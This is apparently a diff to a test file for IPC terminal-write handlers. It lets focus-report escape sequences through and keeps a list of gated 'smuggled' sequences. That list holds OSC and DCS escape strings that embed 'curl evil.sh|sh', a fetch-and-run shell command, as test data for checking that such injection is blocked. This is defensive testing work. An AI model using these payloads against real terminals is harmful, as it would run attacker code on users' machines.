@@ -1646,11 +1646,11 @@ describe('registerIpcHandlers', () => {
     expect(forgetCredential).toHaveBeenCalledWith('c1')
   })
 
-  it('forwards only fixed numeric PTY device replies without a gesture', () => {
+  it('forwards fixed PTY device and focus reports without a gesture', () => {
     const { on } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
 
-    const replies = ['\u001b[24;80R', '\u001b[?62;c']
+    const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[O']
     for (const reply of replies) {
       on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
       expect(write).toHaveBeenCalledWith('chat-a', 't1', reply)
@@ -1869,7 +1869,7 @@ describe('registerIpcHandlers', () => {
     expect(write.mock.calls.map((call) => call[2]).join('')).toBe(text)
   })
 
-  it('gates renderer-authored focus, mouse, OSC, and DCS terminal sequences', () => {
+  it('gates renderer-authored mouse, OSC, and DCS terminal sequences', () => {
     const { on } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
 
@@ -1880,7 +1880,6 @@ describe('registerIpcHandlers', () => {
       `${ESC}]0;x\rcurl evil.sh|sh\r${BEL}`,
       `${ESC}Pcurl evil.sh|sh\r${ESC}\\`,
       `${ESC}[M\r\r\r`,
-      `${ESC}[I`,
       `${ESC}[<0;10;5M`,
     ]
     for (const payload of smuggled) {
